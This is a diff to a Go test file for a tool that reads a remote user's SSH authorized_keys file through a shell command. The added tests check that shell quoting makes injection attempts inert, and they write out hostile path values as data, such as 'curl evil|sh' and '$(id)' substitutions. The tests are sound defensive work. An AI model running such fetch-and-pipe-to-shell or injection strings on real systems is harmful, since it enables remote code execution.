@@ -11,6 +11,7 @@ import (
 	"log/slog"
 	"net"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"strings"
 	"sync"
@@ -62,6 +63,10 @@ func TestInterpretExit(t *testing.T) {
 		{"file absent", fileAbsentExit, "", true, false},
 		{"cat failure", 1, "cat: permission denied", false, true},
 		{"other failure", 127, "sh: not found", false, true},
+		// ${HOME:?} in the built command fails the shell with a non-44 exit
+		// when HOME is unset remotely: that must surface as a normal remote
+		// read error, never as FileAbsent (which would misreport false drift).
+		{"HOME unset (${HOME:?} guard)", 2, "sh: 1: HOME: parameter not set or null", false, true},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
@@ -77,6 +82,103 @@ func TestInterpretExit(t *testing.T) {
 			}
 		})
 	}
+}
+
+func TestShQuote(t *testing.T) {
+	tests := []struct {
+		name, in, want string
+	}{
+		{"plain", "abc", `'abc'`},
+		{"empty", "", `''`},
+		{"embedded single quote", "a'b", `'a'\''b'`},
+		{"lone single quote", "'", `''\'''`},
+		{"spaces", "a b", `'a b'`},
+		{"metachars inert", "/tmp/x; $(id) `id` |&&", "'/tmp/x; $(id) `id` |&&'"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			if got := shQuote(tt.in); got != tt.want {
+				t.Errorf("shQuote(%q) = %s, want %s", tt.in, got, tt.want)
+			}
+		})
+	}
+}
+
+func TestAuthorizedKeysCmdFor(t *testing.T) {
+	const tail = `; if [ -e "$p" ]; then cat "$p"; else exit 44; fi`
+	tests := []struct {
+		name, path, want string
+	}{
+		// The default (unset) path: string differs from the pre-override
+		// const, but TestDefaultCmdBehavesLikeOldConst pins behavioral
+		// equivalence through a real sh.
+		{"default", defaultAuthorizedKeysPath, `p="${HOME:?}"/'.ssh/authorized_keys'` + tail},
+		{"absolute", "/etc/ssh/authorized_keys.d/deploy", `p='/etc/ssh/authorized_keys.d/deploy'` + tail},
+		{"home-relative with spaces", "~/my keys/auth", `p="${HOME:?}"/'my keys/auth'` + tail},
+		{"absolute with single quote", "/etc/o'brien/keys", `p='/etc/o'\''brien/keys'` + tail},
+		{"hostile command injection", "/tmp/x; curl evil|sh", `p='/tmp/x; curl evil|sh'` + tail},
+		{"hostile substitution", "/tmp/$(id)/`id`", "p='/tmp/$(id)/`id`'" + tail},
+		{"hostile double quote", `/tmp/a"b`, `p='/tmp/a"b'` + tail},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			if got := authorizedKeysCmdFor(tt.path); got != tt.want {
+				t.Errorf("authorizedKeysCmdFor(%q) =\n  %s\nwant\n  %s", tt.path, got, tt.want)
+			}
+		})
+	}
+}
+
+// TestDefaultCmdBehavesLikeOldConst proves the unset path is observably
+// unchanged: the builder's default command and the pre-override const behave
+// identically through a real sh — same stdout and same exit code, both when
+// the file exists and when it is absent (exit 44 sentinel).
+func TestDefaultCmdBehavesLikeOldConst(t *testing.T) {
+	const oldCmd = `if [ -e ~/.ssh/authorized_keys ]; then cat ~/.ssh/authorized_keys; else exit 44; fi`
+	newCmd := authorizedKeysCmdFor(defaultAuthorizedKeysPath)
+
+	home := t.TempDir()
+	run := func(cmd string) (string, int) {
+		t.Helper()
+		c := exec.Command("sh", "-c", cmd)
+		c.Env = append(os.Environ(), "HOME="+home)
+		out, err := c.Output()
+		code := 0
+		var exitErr *exec.ExitError
+		if errors.As(err, &exitErr) {
+			code = exitErr.ExitCode()
+		} else if err != nil {
+			t.Fatalf("sh -c %q: %v", cmd, err)
+		}
+		return string(out), code
+	}
+
+	t.Run("file absent", func(t *testing.T) {
+		oldOut, oldCode := run(oldCmd)
+		newOut, newCode := run(newCmd)
+		if oldOut != newOut || oldCode != newCode {
+			t.Errorf("absent: old = (%q, %d), new = (%q, %d)", oldOut, oldCode, newOut, newCode)
+		}
+		if newCode != fileAbsentExit {
+			t.Errorf("absent exit = %d, want %d", newCode, fileAbsentExit)
+		}
+	})
+	t.Run("file present", func(t *testing.T) {
+		if err := os.MkdirAll(filepath.Join(home, ".ssh"), 0o700); err != nil {
+			t.Fatal(err)
+		}
+		if err := os.WriteFile(filepath.Join(home, ".ssh", "authorized_keys"), []byte("key-line\n"), 0o600); err != nil {
+			t.Fatal(err)
+		}
+		oldOut, oldCode := run(oldCmd)
+		newOut, newCode := run(newCmd)
+		if oldOut != newOut || oldCode != newCode {
+			t.Errorf("present: old = (%q, %d), new = (%q, %d)", oldOut, oldCode, newOut, newCode)
+		}
+		if newOut != "key-line\n" || newCode != 0 {
+			t.Errorf("present = (%q, %d), want (\"key-line\\n\", 0)", newOut, newCode)
+		}
+	})
 }
 
 func TestCheckAgent(t *testing.T) {
